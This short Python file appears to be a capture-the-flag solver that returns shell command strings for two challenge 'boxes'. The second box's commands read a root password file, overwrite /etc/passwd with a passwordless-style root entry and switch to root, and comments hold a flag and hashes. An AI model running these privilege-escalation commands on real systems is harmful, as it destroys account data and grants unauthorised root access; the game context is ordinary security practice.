def runShell(boxNr):
    print (boxNr)
    if boxNr == 1:
        return "cd /root ; ls ; echo root.txt ; CodeWars{7594357083475890320019dsfsdjfl32423hjkasd9834haksdSKJAHD32423khdf}"
    elif boxNr == 2:
        return "pwd; echo ls -l; ls -l;echo help; help;echo cat root_password; cat root_password;\
        echo cd /etc;cd /etc; echo ls -l; ls -l; echo 'echo' root:a:0:0::/root:/bin/bash ''>'' passwd';\
        echo root:a:0:0::/root:/bin/bash > passwd ; echo 'cat''passwd'; cat passwd; echo 'su' 'root' 'a'; su root a"
    else:
        return "help"
    #"help ; whoami ; pwd  ; ls -l; cat root_password; echo   .; cd /; ls -l ; cd /etc ; \
    #    echo , ; whoami ;ls -l;cat passwd ; echo root:hehe:0:0::/root:/bin/bash > passwd ; man ls -l ;\
    #    cat passwd; su root hehe ; cd /; ls -l; cd /root   "
    
    #### boxNr 1
    #/home/nobody
    #creditcard_credentials
    
    #15F343BDA863AE79D944A625D209CD8DDC91A358357E8ACF7B6942C1932136E8
    #49D4C450CAB6CCFFE08CFDB67AC03D4D8B661F606CB586D08FEA362B5A3B064C
    #62BFA285013F08807D394266CDF8261DD060A704959AE9C20E4AD262B65DA12A
    
    #CodeWars{7594357083475890320019dsfsdjfl32423hjkasd9834haksdSKJAHD32423khdf}
    
    #### boxNr 2
    # cd /etc
    # root:x:0:0::/root:/bin/bash